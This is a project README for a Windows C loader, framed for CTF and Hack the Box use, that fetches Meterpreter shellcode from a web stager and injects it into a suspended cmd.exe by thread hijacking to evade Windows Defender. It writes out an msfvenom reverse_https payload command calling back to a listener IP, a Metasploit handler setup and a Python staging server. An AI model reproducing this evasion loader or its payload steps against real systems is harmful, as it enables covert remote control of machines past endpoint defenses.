# 🎯 Meterpreter Payload Exectuion ~ CTF 

A lightweight Windows C application developed using **Visual Studio**. This project aims to execute a Meterpreter payload with Defender enabled. The purpose is to use this exe on harder Hack the Box machines. This approach helps bypass Defender, although some Meterpreter functionalities may still be flagged. This solution results from work done after following **MALDEV Academy** — a fantastic course that helped me reach this level.

---
⚠️ **Disclaimer:** This project is for educational purposes only. It is designed to help individuals understand how malware operates so they can better defend against it. Its intended purpose is for Hack the Box or CTF-like events. 

## Approach

- Utilize a web stager to host the raw Meterpreter Binary. This fetches the shell code at runtime and will avoid some common signatures by not storing the shell code on disk.
- I then create a suspended process, "cmd.exe" and then hijack a thread of that process to execute the shell code


## 🚀 Getting Started

This is designed to be a web cradle. This exe will fetch your payload at run time and then call back with a Meterpreter payload on a different port. The steps below are for setup.


### 🌱 Kali setup

1. Build the Payload 
``` bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.216.130 LPORT=8000 -f raw exitfunc=process --bad-chars '\x00' -o Meterpreter_Payload
# Change the LHOST and PORT for your local machine that is hosting Metasploit
```

2. Open Metasploit


 ```bash
# In a different terminal setup Metasploit below
msfconsole
use multi/handler
#set the lhost, lport, and payload to match the command above
 ```
3. Setup the python server

``` bash
# In the same directory as the payload and a different terminal as Metasploit, run the following commands
python3 -m http.server 8080
``` 

4. Below is a screenshot of what your terminal should look like

![alt text](image.png)


### 🛠️ Build Instructions

1. Clone the repository:

2. Open the `.sln` file in **Visual Studio**

    - Change the IP and Port for your Kali machine. Make sure the port used hosts the Python server.

3. Build the project:
    - Select **Build > Build Solution** (or press `Ctrl+Shift+B`)
    - Set build mode to `Debug` or `Release`

4. Run the executable from Visual Studio

5. Below are screenshots of the output

- Executing the payload on the target
![alt text](image-1.png)

- A callback,, then a Meterpreter shell
![alt text](image-2.png)

## 📚 Credits

- **MALDEV Academy** — [maldevacademy.com](https://maldevacademy.com)  
  A fantastic resource for learning malware development techniques.
  
- **Offensive Security Community** — [offensive-security.com](https://www.offensive-security.com)  
  The community behind Kali Linux and other offensive security tools.

- **Metasploit** — [metasploit.com](https://www.metasploit.com)  
  A powerful framework for developing and executing exploit code against remote target machines.


---
